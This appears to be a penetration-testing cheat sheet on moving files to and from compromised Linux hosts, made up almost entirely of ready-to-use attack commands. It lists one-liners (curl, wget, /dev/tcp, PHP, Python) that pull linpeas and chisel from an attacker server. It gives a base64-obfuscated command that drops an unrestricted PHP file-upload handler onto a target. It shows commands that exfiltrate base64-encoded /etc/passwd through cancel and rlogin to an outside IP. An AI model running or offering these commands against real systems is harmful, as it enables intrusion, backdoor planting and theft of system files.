# File Transfer

## Infiltration

### General

<table><thead><tr><th width="194">Info</th><th>Command</th></tr></thead><tbody><tr><td>curl</td><td><code>curl -o linpeas.sh http://$lhost/linpeas.sh</code></td></tr><tr><td>wget</td><td><code>wget http://$lhost/linpeas.sh -O linpeas.sh</code></td></tr><tr><td>bash</td><td><code>exec 3&#x3C;>/dev/tcp/$lhost/80; echo -e "GET /linpeas.sh HTTP/1.1\n\n">&#x26;3; cat &#x3C;&#x26;3 > linpeas.sh</code></td></tr><tr><td>bash</td><td><code>exec 3&#x3C;>/dev/tcp/$lhost/80; echo -e "GET /chisel HTTP/1.1\n\n">&#x26;3; cat &#x3C;&#x26;3 > chisel</code></td></tr><tr><td>php File_get_contents()</td><td><code>php -r '$file = file_get_contents("http://$lhost/linux/privesc/linpeas.sh"); file_put_contents("linpeas.sh",$file);'</code></td></tr><tr><td>php Fopen()</td><td><code>php -r 'const BUFFER = 1024; $fremote = fopen("http://10.4.29.43/linux/privesc/linpeas.sh", "rb"); $flocal = fopen("linpeas.sh", "wb"); while ($buffer = fread($fremote, BUFFER)) { fwrite($flocal, $buffer); } fclose($flocal); fclose($fremote);'</code></td></tr><tr><td>php php-curl</td><td><code>php -r '$rfile = "http://10.4.29.43/linux/privesc/linpeas.sh"; $lfile = "linpeas.sh"; $fp = fopen($lfile, "w+"); $ch = curl_init($rfile); curl_setopt($ch, CURLOPT_FILE, $fp); curl_setopt($ch, CURLOPT_TIMEOUT, 20); curl_exec($ch);'</code></td></tr><tr><td>Python 2 (In python console)</td><td><code>import urllib;urllib.urlretrieve ("http://10.4.29.43/linpeas.sh", "linpeas.sh")</code></td></tr><tr><td>Python 3 (In python console)</td><td><code>import urllib.request;urllib.request.urlretrieve("http://10.4.29.43/linpeas.sh", "linpeas.sh")</code></td></tr></tbody></table>

### HTML / PHP file upload form

{% code overflow="wrap" %}
```bash
echo 'PCFET0NUWVBFIGh0bWw+CjxodG1sPgo8Ym9keT4KCjxmb3JtIGFjdGlvbj0idXBsb2FkLnBocCIgbWV0aG9kPSJwb3N0IiBlbmN0eXBlPSJtdWx0aXBhcnQvZm9ybS1kYXRhIj4KICBTZWxlY3QgaW1hZ2UgdG8gdXBsb2FkOgogIDxpbnB1dCB0eXBlPSJmaWxlIiBuYW1lPSJmaWxlVG9VcGxvYWQiIGlkPSJmaWxlVG9VcGxvYWQiPgogIDxpbnB1dCB0eXBlPSJzdWJtaXQiIHZhbHVlPSJVcGxvYWQgSW1hZ2UiIG5hbWU9InN1Ym1pdCI+CjwvZm9ybT4KCjwvYm9keT4KPC9odG1sPgo=' | base64 -d > upload.html && echo 'PD9waHAKJHRhcmdldF9kaXIgPSAiLi8iOwokdGFyZ2V0X2ZpbGUgPSAkdGFyZ2V0X2RpciAuIGJhc2VuYW1lKCRfRklMRVNbImZpbGVUb1VwbG9hZCJdWyJuYW1lIl0pOwptb3ZlX3VwbG9hZGVkX2ZpbGUoJF9GSUxFU1siZmlsZVRvVXBsb2FkIl1bInRtcF9uYW1lIl0sICR0YXJnZXRfZmlsZSk7Cj8+' | base64 -d > upload.php
```
{% endcode %}

## Exfiltration

| Info                 | Command                                                   |
| -------------------- | --------------------------------------------------------- |
| Using cancel command | `cancel -u "$(cat /etc/passwd \| base64)" -h <ip>:<port>` |
| Using rlogin command | `rlogin -l "$(cat /etc/passwd \| base64)" -p <port> <ip>` |
|                      |                                                           |
